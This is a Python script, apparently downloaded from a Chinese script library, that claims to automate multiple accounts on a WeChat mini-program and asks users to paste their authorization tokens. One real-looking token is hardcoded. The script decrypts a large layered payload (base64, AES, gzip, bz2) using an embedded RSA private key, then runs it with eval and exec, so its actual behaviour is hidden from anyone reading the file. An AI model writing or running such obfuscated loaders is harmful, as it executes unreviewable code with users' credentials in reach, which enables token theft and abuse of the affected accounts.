# 当前脚本来自于http://script.345yun.cn脚本库下载！
import requests
#小程序:#小程序://知享芳华/xTsLk6d1InqGfeC
#抓authorization值
# -------------------------- 多账号配置（用#分割authorization） --------------------------
# 在此处添加或修改账号，格式：账号1eyJhbGciOiJIUzUxMiJ9.eyJ1c2VySW5mbyI6IntcImlkXCI6MTE5MzAzfSIsImF1dGhvcml0aWVzIjpbXSwiY3JlYXRlZCI6MTc2MTgxNDMyMTM5MiwiZXhwIjoxNzY5NTkwMzIxfQ.V8ACFHJJLfj_UTy01xKtmukiwNJK3tyxf_mB0IJYV20L7BgK75L2P6JD1Dv46EYz5SrbtyZufawrWhw0Nbrptw#
auth_str = "eyJhbGciOiJIUzUxMiJ9.eyJ1c2VySW5mbyI6IntcImlkXCI6MTE5MzAzfSIsImF1dGhvcml0aWVzIjpbXSwiY3JlYXRlZCI6MTc2MTgxNDMyMTM5MiwiZXhwIjoxNzY5NTkwMzIxfQ.V8ACFHJJLfj_UTy01xKtmukiwNJK3tyxf_mB0IJYV20L7BgK75L2P6JD1Dv46EYz5SrbtyZufawrWhw0Nbrptw"      #这里就是填账号的 
# 分割字符串得到所有账号的authorization列表
auth_list = auth_str.split("#")
import base64,zlib,lzma,gzip,bz2,os
from Crypto.Cipher import AES, DES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Util.Padding import pad,unpad
from Crypto.Hash import SHA256
def get_password_derived_key(p):return SHA256.new(p).digest()[:16]
KEY_PASSWORD=b"a40df35868e3"
ENCRYPTED_AES_KEY_RSA=base64.b64decode("My80ytdc6S7Ol1uvF7PZ27Jn6gauM1dtMndeT7NcC+KvRCZmOPawPw4OehXBv2grbRaExoEHPxZD+1rS4tqYi5IKIwQdGHoTtitPtAZ8juoKhDEwJyrzHRVab10EtIgUDB2XI0QAy+x6P287qvdS8OpQPzZmNnCP3rjQ8DI0A9w=")
RSA_PRIVATE_KEY_B64=base64.b64decode("LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlDWFFJQkFBS0JnUURGRmlINHJkY1ArcHFPZzFFcGpiekVxRHBYVjVJRXY4MVlVVmVXcnJsb051SG5ZeXg3CmdkM041ZFllVjkzamRraTVldExkY3N0VW5HTTE2VG9tbEMveFlLQTBWNkM5QVhvbitkeU1Sano3aWl0VENxbHgKYTBJT1llQXlJZ2JOckhmVm0waXRIejJBSnZvWmIvQXdJSEVXamw1cEU5MEMyazdZY3Qzd0NnYTl6d0lEQVFBQgpBb0dBQnpqOVlmUGJiMkpJYzRBSWFITjZHazhLbEp2KzZxVm9wRWY1QVZidWE0TjhuRzE2dWtSekpaU1RWL2JLCmRTNzF1TWtzb2MyaTVsaTAvM0tYSWp3Y2o1ek9GQkN5NjlRVzh3YmdWckNPQTFiYldXYjlVWXdtQnFQWGp6dXAKSThLUzRXZFdOVk04MDBrZGp5R1d3MXRYVDZ1bTBIVGJQOVdRVzdDRHh4UzdFT1VDUVFETjhGdkkxZ0FVdU0xeQpqVkszck9aVWlDamowWDJ6ZE80WUYxTzRhRlNFRTNQMWVISURFZE5IcCtuTTBVeld2cE1ZdFRZcUU0WXI3bUtGCjdkSHpxL3lsQWtFQTlQN2lRS055MHNFeGtVVDdKK1FoeXZRa0pIcXBXSzJ2Smlac0N2ZnptVGdGb1IyWkM4ZmUKTEI2QUtZekRXM09DYjBBeVI3UWFpVFNsVGxMVGJLUENZd0pCQUluRnQySFE2UlR6M1Y0NWRaRXp0cFB1MDR3MQo1bVpjWDd6MlBpZ3NnLzRvRlhldk1IY2xRYmU2ZWd0d0tudXYyekM0YXBnVG43dGNLOFYxcVBQZnA1RUNRQkphCjNqeVZnazdENXFESm1EOSsyZ0ZJbFVTZVkvMmUxWlo0SG5RYjY0WTVLa0xONHQ5OUUrb2VSdC9XQ2ZUYURKV2wKSzU4dm9TVlNhbWdaMEhrOU01MENRUUROM0s0dG94QmVDd0YvY0dPMHlrMXBRcHVGdUEvbWlLbDJWRzVIbktjbQpGZ0RYaTJPTVlTZTg0Tk8zbHVJNE5QM2I3NWxDbENwUXNNWjhKTFFFWTBhRAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQ==")
ENCRYPTED_DES_KEY=base64.b64decode("Ww3P14l1L6IcA3ZbQpbrLQ==")
PASSWORD_KEY=get_password_derived_key(KEY_PASSWORD)
RSA_PRIVATE_KEY=RSA.import_key(RSA_PRIVATE_KEY_B64)
RAW_AES_KEY=PKCS1_OAEP.new(RSA_PRIVATE_KEY).decrypt(ENCRYPTED_AES_KEY_RSA)
RAW_DES_KEY=unpad(AES.new(PASSWORD_KEY,AES.MODE_ECB).decrypt(ENCRYPTED_DES_KEY),DES.block_size)
def _aes_dec(d):return unpad(AES.new(RAW_AES_KEY,AES.MODE_ECB).decrypt(d),AES.block_size)
def _des_dec(d):return unpad(DES.new(RAW_DES_KEY,DES.MODE_ECB).decrypt(d),DES.block_size)
def d(d,ops):
 for op in reversed(ops):d=zlib.decompress(d)if op=="zlib"else lzma.decompress(d)if op=="lzma"else gzip.decompress(d)if op=="gzip"else bz2.decompress(d)if op=="bz2"else base64.b64decode(d)if op=="base64"else _aes_dec(d)if op=="aes"else _des_dec(d)if op=="des"else d
 return d.decode()
e,b="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","WydhZXMnLCAnZ3ppcCcsICdiejInXQ==";o=eval(base64.b64decode(b).decode())
try:exec(d(base64.b64decode(e),o))
except Exception as x:print("Error:"+str(x))
# 当前脚本来自于http://script.345yun.cn脚本库下载！
